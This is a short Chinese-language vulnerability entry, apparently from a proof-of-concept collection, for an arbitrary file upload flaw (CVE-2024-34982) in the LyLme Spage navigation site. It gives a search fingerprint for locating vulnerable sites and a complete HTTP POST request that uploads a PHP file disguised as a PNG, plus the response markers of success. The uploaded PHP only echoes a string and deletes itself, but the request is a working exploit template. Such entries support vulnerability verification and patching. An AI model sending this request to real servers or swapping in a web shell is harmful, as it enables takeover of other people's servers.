﻿# 六零导航页 file.php 任意文件上传漏洞

> 更新时间：2024-05-20

> 漏洞编号：CVE-2024-34982

> 漏洞说明：六零导航页 (LyLme Spage) 致力于简洁高效无广告的上网导航和搜索入口，支持后台添加链接、自定义搜索引擎，沉淀最具价值链接，全站无商业推广，简约而不简单。该系统file.php接口处存在任意文件上传漏洞，可能导致服务器失陷。

> 漏洞特征：title=="上网导航 - LyLme Spage"

> 验证脚本：HTTP

```
POST /include/file.php HTTP/1.1
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------qttl7vemrsold314zg0f
X-Requested-With: XMLHttpRequest

-----------------------------qttl7vemrsold314zg0f
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: image/png

<?php echo "dudesuite";unlink(__FILE__);?>
-----------------------------qttl7vemrsold314zg0f--
```

> 响应代码特征：200

> 响应内容特征：上传成功

> 上传文件定位：

> 验证文件来源：六零导航页 file.php 任意文件上传漏洞.poc

